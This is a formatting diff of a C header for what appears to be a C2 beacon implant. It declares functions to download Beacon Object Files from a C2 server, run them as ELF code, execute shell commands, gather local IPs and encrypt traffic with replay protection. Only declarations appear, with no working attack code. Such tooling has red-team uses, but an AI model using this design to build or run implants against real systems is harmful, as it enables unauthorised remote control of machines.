@@ -23,43 +23,48 @@
  * default is 64KB which handles most BOFs. If a BOF produces more
  * output, it is truncated with a marker appended. The operator
  * can increase this via config.json "bof.output_buffer_size". */
-#define BSB_OUTPUT_BUFFER_DEFAULT  65536
-#define BSB_OUTPUT_TRUNCATION_MARKER "\n[OUTPUT TRUNCATED - increase bof.output_buffer_size in config.json]\n"
+#define BSB_OUTPUT_BUFFER_DEFAULT 65536
+#define BSB_OUTPUT_TRUNCATION_MARKER                                                               \
+    "\n[OUTPUT TRUNCATED - increase bof.output_buffer_size in config.json]\n"
 
 /* --- HTTP response wrapper ---
  * https_request now returns a proper struct instead of the
  * broken full+8 pointer trick that leaked memory. */
-typedef struct {
-    char    *data;      /* response body (malloc'd, caller frees) */
-    size_t   len;       /* body length in bytes */
-    int      status;    /* HTTP status code (0 on error) */
+typedef struct
+{
+    char *data; /* response body (malloc'd, caller frees) */
+    size_t len; /* body length in bytes */
+    int status; /* HTTP status code (0 on error) */
 } http_response_t;
 
 /* --- Trampoline (for position-independent BOF relocations) --- */
-typedef struct {
-    void    *addr;
-    size_t   size;
+typedef struct
+{
+    void *addr;
+    size_t size;
 } Trampoline;
 
 /* --- BOF function signature --- */
-typedef void (*bof_func_t)(char*, int);
+typedef void (*bof_func_t)(char *, int);
 
 /* --- Symbol resolver table entry --- */
-typedef struct {
-    const char  *name;
-    void       **ptr;
+typedef struct
+{
+    const char *name;
+    void **ptr;
 } SymbolResolver;
 
 /* --- Trampoline cache entry --- */
-typedef struct {
-    void    *original;
-    void    *trampoline;
+typedef struct
+{
+    void *original;
+    void *trampoline;
 } TrampolineCache;
 
 /* --- Global state (defined in beacon_common.c) --- */
-extern char    *g_beacon_output;
-extern size_t   g_output_len;
-extern size_t   g_output_capacity;
+extern char *g_beacon_output;
+extern size_t g_output_len;
+extern size_t g_output_capacity;
 
 /* Function pointers exposed to BOFs */
 extern void *g_printf_ptr;
@@ -106,34 +111,48 @@ void BeaconOutput(int type, const char *data, int len);
 
 /* Trampoline management */
 void *create_trampoline(void *target);
-void  cleanup_trampolines(void);
+void cleanup_trampolines(void);
 void *get_or_create_trampoline(void *target);
 
 /* HTTP client: performs GET or POST request. Returns a struct
  * with the response body, length, and status code. On error,
  * data is NULL and len is 0. The caller must free(data).
  * Uses config for timeouts, TLS verification, and user-agent. */
-http_response_t https_request(const bsb_config_t *cfg,
-                               const char *url,
-                               const char *method,
-                               const char *post_data);
+http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method,
+                              const char *post_data);
 
 /* Base64 encode/decode (OpenSSL BIO-based) */
-char           *base64_encode(const unsigned char *input, int len);
-unsigned char  *base64_decode(const char *input, int *len);
+char *base64_encode(const unsigned char *input, int len);
+unsigned char *base64_decode(const char *input, int *len);
 
 /* URL percent-encoding (RFC 3986 unreserved set) */
 char *url_encode(const char *in, size_t in_len, size_t *out_len);
 
+/* Secure IV generation: tries RAND_bytes, falls back to getrandom(2).
+ * Returns 1 on success, 0 on failure (fail-closed). */
+int bsb_generate_secure_iv(unsigned char *iv_out);
+
 /* AES-256-CFB encrypt/decrypt (standalone, no OpenSSL dependency) */
-unsigned char *aes256_cfb_encrypt(const unsigned char *key,
-                                   const unsigned char *iv,
-                                   const unsigned char *plaintext,
-                                   size_t len, int *out_len);
-unsigned char *aes256_cfb_decrypt(const unsigned char *key,
-                                   const unsigned char *iv,
-                                   const unsigned char *ciphertext,
-                                   size_t len, int *out_len);
+unsigned char *aes256_cfb_encrypt(const unsigned char *key, const unsigned char *iv,
+                                  const unsigned char *plaintext, size_t len, int *out_len);
+unsigned char *aes256_cfb_decrypt(const unsigned char *key, const unsigned char *iv,
+                                  const unsigned char *ciphertext, size_t len, int *out_len);
+
+/* Replay-protected encryption: prepends counter (8 bytes LE) and timestamp (8 bytes LE)
+ * to plaintext before AES-CFB encryption. Returns malloc'd buffer with IV + ciphertext.
+ * Caller must free the returned buffer. */
+unsigned char *aes256_cfb_encrypt_replay(const unsigned char *key, const unsigned char *iv,
+                                         const unsigned char *plaintext, size_t len,
+                                         uint64_t counter, uint64_t timestamp,
+                                         int *out_len);
+
+/* Replay-protected decryption: decrypts ciphertext, extracts counter and timestamp.
+ * Returns malloc'd plaintext (without counter/timestamp), sets *out_counter and *out_timestamp.
+ * Returns NULL on decryption failure. */
+unsigned char *aes256_cfb_decrypt_replay(const unsigned char *key, const unsigned char *iv,
+                                         const unsigned char *ciphertext, size_t len,
+                                         uint64_t *out_counter, uint64_t *out_timestamp,
+                                         int *out_len);
 
 /* Execute a shell command and capture output. Returns malloc'd
  * buffer (caller frees). On error, returns NULL. */
@@ -144,25 +163,17 @@ char *exec_cmd(const char *cmd, int *out_len);
  * entry function in a forked child process for crash isolation.
  * Returns 0 on success, -1 on error. BOF output is captured
  * into g_beacon_output. */
-int RunELF(const char *functionname,
-           unsigned char *elf_data,
-           uint32_t filesize,
-           unsigned char *argumentdata,
-           int argumentSize);
+int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize,
+           unsigned char *argumentdata, int argumentSize);
 
 /* Download a BOF from the C2 server. Returns malloc'd buffer
  * (caller frees). On error, sets *out_size to 0 and returns NULL. */
-unsigned char *download_bof(const bsb_config_t *cfg,
-                             const char *url,
-                             size_t *out_size);
+unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size);
 
 /* Execute a BOF and capture its output. Returns malloc'd string
  * (caller frees). On error or empty output, returns strdup(""). */
-char *run_bof_and_capture(unsigned char *elf_data,
-                           uint32_t filesize,
-                           char *args,
-                           int arglen,
-                           int *out_len);
+char *run_bof_and_capture(unsigned char *elf_data, uint32_t filesize, char *args, int arglen,
+                          int *out_len);
 
 /* Get local IP addresses as a comma-separated string. Returns
  * malloc'd buffer (caller frees). Falls back to "127.0.0.1". */
@@ -170,14 +181,15 @@ char *get_local_ips(void);
 
 /* Exponential backoff state. Initialize once, call bsb_backoff_next()
  * to get the next sleep duration. Automatically resets on success. */
-typedef struct {
+typedef struct
+{
     int current_seconds;
     int base_seconds;
     int max_seconds;
 } bsb_backoff_t;
 
 void bsb_backoff_init(bsb_backoff_t *bo, int base, int max);
-int  bsb_backoff_next(bsb_backoff_t *bo);
+int bsb_backoff_next(bsb_backoff_t *bo);
 void bsb_backoff_reset(bsb_backoff_t *bo);
 
 #endif /* BEACON_COMMON_H */
